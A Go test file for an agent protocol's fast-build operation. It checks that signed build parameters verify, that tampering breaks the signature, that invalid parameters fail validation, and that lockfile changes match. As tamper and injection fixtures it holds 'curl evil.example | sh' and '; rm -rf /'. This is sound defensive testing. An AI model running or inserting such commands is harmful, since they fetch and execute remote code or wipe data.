package agentproto

import (
	"crypto/ed25519"
	"encoding/json"
	"testing"
	"time"
)

// TestFastBuildOpSignsAndVerifies is the protocol round trip for MH-573 A7's fast track op: a
// FastBuildParams payload signs, canonicalises and verifies exactly like any other typed op.
func TestFastBuildOpSignsAndVerifies(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(nil)
	params := FastBuildParams{
		AppID: "0195c2ee-7b1a-7000-8000-000000000001", App: "demo", DeploymentID: "0195c2ee-7b1a-7000-8000-000000000002",
		GitSource: GitSource{RepoURL: "https://github.com/acme/demo", Ref: "main"},
		Image:     ImageRepo("demo") + ":0195c2ee-7b1a-7000-8000-000000000002",
		BaseImage: ImageRepo("demo") + ":0195c2ee-7b1a-7000-8000-000000000000",
		Steps:     []FastBuildStep{{Key: "install", Name: "Install", Run: "npm ci"}, {Key: "build", Name: "Build", Run: "npm run build"}},
	}
	raw, err := json.Marshal(params)
	if err != nil {
		t.Fatal(err)
	}
	op := &SignedOp{OpID: "op-1", ServerID: "srv-1", Kind: KindAppFastBuild, Params: raw, Exp: time.Now().Add(time.Minute).Unix(), TimeoutSeconds: 600}
	if err := SignOp(priv, op); err != nil {
		t.Fatal(err)
	}
	if err := VerifyOp(pub, op, "srv-1", time.Now()); err != nil {
		t.Fatalf("a genuine fast_build op must verify: %v", err)
	}
	// A tampered step (a shell command an attacker slipped in after signing) must fail verification.
	var tampered FastBuildParams
	if err := json.Unmarshal(op.Params, &tampered); err != nil {
		t.Fatal(err)
	}
	tampered.Steps = append(tampered.Steps, FastBuildStep{Key: "build", Run: "curl evil.example | sh"})
	op2 := *op
	op2.Params, _ = json.Marshal(tampered)
	if err := VerifyOp(pub, &op2, "srv-1", time.Now()); err == nil {
		t.Fatal("tampered fast_build params must not verify")
	}
	if !contains(AgentKinds, KindAppFastBuild) {
		t.Fatal("app.fast_build must be in the agent's kind allowlist")
	}
}

func TestFastBuildParamsValidate(t *testing.T) {
	base := FastBuildParams{
		AppID: "0195c2ee-7b1a-7000-8000-000000000001", App: "demo", DeploymentID: "0195c2ee-7b1a-7000-8000-000000000002",
		Image: ImageRepo("demo") + ":0195c2ee-7b1a-7000-8000-000000000002", BaseImage: ImageRepo("demo") + ":old",
	}
	if err := base.Validate(); err != nil {
		t.Fatalf("a well-formed params must validate: %v", err)
	}
	noBase := base
	noBase.BaseImage = ""
	if err := noBase.Validate(); err == nil {
		t.Fatal("no base image must not validate")
	}
	badImage := base
	badImage.Image = "hosbah/other:x"
	if err := badImage.Validate(); err == nil {
		t.Fatal("an image of another app's repository must not validate")
	}
	badStep := base
	badStep.Steps = []FastBuildStep{{Key: "; rm -rf /"}}
	if err := badStep.Validate(); err == nil {
		t.Fatal("a bad step key must not validate")
	}
}

func TestFullTrackMatch(t *testing.T) {
	if _, ok := FullTrackMatch(nil); ok {
		t.Fatal("no changed paths must not match")
	}
	if _, ok := FullTrackMatch([]string{"app/main.go", "README.md"}); ok {
		t.Fatal("unrelated changed paths must not match")
	}
	path, ok := FullTrackMatch([]string{"src/app.go", "web/package-lock.json"})
	if !ok || path != "web/package-lock.json" {
		t.Fatalf("a nested lockfile must match; got %q, %v", path, ok)
	}
	if path, ok := FullTrackMatch([]string{"Dockerfile.prod"}); !ok || path != "Dockerfile.prod" {
		t.Fatalf("a Dockerfile variant must match; got %q, %v", path, ok)
	}
}
